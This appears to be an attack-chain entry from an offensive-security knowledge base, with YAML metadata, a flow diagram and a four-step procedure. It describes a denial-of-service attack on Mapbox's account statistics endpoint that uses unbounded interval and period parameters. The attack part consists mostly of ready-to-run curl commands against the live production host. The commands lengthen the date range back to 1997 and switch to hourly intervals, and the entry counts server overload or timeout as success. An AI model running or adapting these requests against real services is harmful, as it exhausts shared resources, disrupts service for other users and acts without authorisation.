---
id: ac-mapbox-dos-parameters
tags:
  - dos
  - denial-of-service
  - resource-exhaustion
  - web-vulnerability
  - api-abuse
type: attack_chain
tools: []
tactics:
  - '[[Impact]]'
verified: false
platforms:
  - Web
submitted: true
complexity: low
created_at: '2024-10-01T00:00:00Z'
procedures:
  - '[[procedures/Authenticate-to-Mapbox-Account]]'
  - '[[procedures/Query-Default-Statistics-Endpoint]]'
  - '[[procedures/Manipulate-Interval-and-Period-for-DoS]]'
  - '[[procedures/Test-Early-Dates-for-Excessive-Processing]]'
step_count: 4
techniques:
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:26:37.067Z'
description: >-
  A multi-step attack exploiting lack of bounds on query parameters in Mapbox's
  account statistics endpoint to trigger excessive data processing and large
  responses, resulting in denial of service.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# DoS via Unbounded Time Period and Interval Parameters in Mapbox Statistics Endpoint

Multi-stage attack chain demonstrating exploitation of unbounded query parameters in Mapbox's user account statistics endpoint to cause a denial of service through excessive resource consumption.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Low |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Authenticate to Account] --> B[Query Default Endpoint]
    B --> C[Manipulate Parameters for Large Data]
    C --> D[Trigger Excessive Processing with Early Dates]
    D --> E[DoS Achieved]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[commands/curl]]

### Target Environment

- Web platform
- Mapbox account with access to statistics endpoint
- Authenticated session (cookies or API token)

### Initial Access Requirements

- Valid Mapbox credentials
- Network access to https://www.mapbox.com
- No prior access needed beyond account creation

## Detailed Attack Procedures

### Step 1: Authenticate to Mapbox Account
procedure: [[procedures/Authenticate-to-Mapbox-Account]]

**Objective**: Obtain an authenticated session to access the statistics endpoint.

**Instructions**: Create or log in to a Mapbox account via the web interface to retrieve session cookies. Use these cookies in subsequent requests.

**Expected Output**: Valid session cookies for API calls.

**Success Indicators**:
- Successful login response
- Cookies extracted (e.g., via browser dev tools)

### Step 2: Query Default Statistics Endpoint
procedure: [[procedures/Query-Default-Statistics-Endpoint]]

**Objective**: Establish baseline response size and confirm endpoint accessibility.

**Instructions**: Send a request to the statistics endpoint using default parameters with your session cookies. Use [[commands/curl-mapbox-default-stats]]:

```bash
curl -H "Cookie: session=your_session_cookie" "https://www.mapbox.com/core/statistics/v1/yourusername/account?interval=day&period=1461766083142,1462370883143&metrics=countries,browsers,hosts,maps,version&services=mapview,tile,static,geocode,permanentgeocode,directions,surface&_=1462370883155"
```

**Expected Output**: JSON response approximately 2.5 KB in size.

**Success Indicators**:
- Response received without errors
- Baseline size noted (e.g., 2.5 KB)

### Step 3: Manipulate Interval and Period for DoS
procedure: [[procedures/Manipulate-Interval-and-Period-for-DoS]]

**Objective**: Modify parameters to request excessive data, increasing response size and backend load.

**Instructions**: Alter the 'interval' to 'hour' and extend the 'period' to cover months or years. Use [[commands/curl-mapbox-dos-params]]:

```bash
curl -H "Cookie: session=your_session_cookie" "https://www.mapbox.com/core/statistics/v1/yourusername/account?interval=hour&period=1451766083142,1462370883143&metrics=countries,browsers,hosts,maps,version&services=mapview,tile,static,geocode,permanentgeocode,directions,surface&_=1462370883155"
```

Further extend period for larger impact.

**Expected Output**: Response size increases to 372 KB or more, with delays in processing.

**Success Indicators**:
- Significantly larger response size
- Increased load time indicating backend strain

### Step 4: Test Early Dates for Excessive Processing
procedure: [[procedures/Test-Early-Dates-for-Excessive-Processing]]

**Objective**: Exploit early start dates to force processing of massive historical datasets.

**Instructions**: Set period starting from a very early date like 1997 with interval=day. Use [[commands/curl-mapbox-early-dates]]:

```bash
curl -H "Cookie: session=your_session_cookie" "https://www.mapbox.com/core/statistics/v1/yourusername/account?interval=day&period=860000000000,1462370883143&metrics=countries,browsers,hosts,maps,version&services=mapview,tile,static,geocode,permanentgeocode,directions,surface&_=1462370883155"
```

**Expected Output**: Extremely large response or timeout due to excessive computation.

**Success Indicators**:
- Server overload or denial of service
- Response size in MB range or failure to respond

## Attack Chain Summary

### Key Achievements

1. Bypassed rate limiting with single requests
2. Forced backend to process years of data
3. Achieved DoS without complex tooling

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Endpoint Denial of Service]]

### MITRE ATT&CK Tactics

- [[Impact]]

---

*Last updated: 2024-10-01T00:00:00Z*
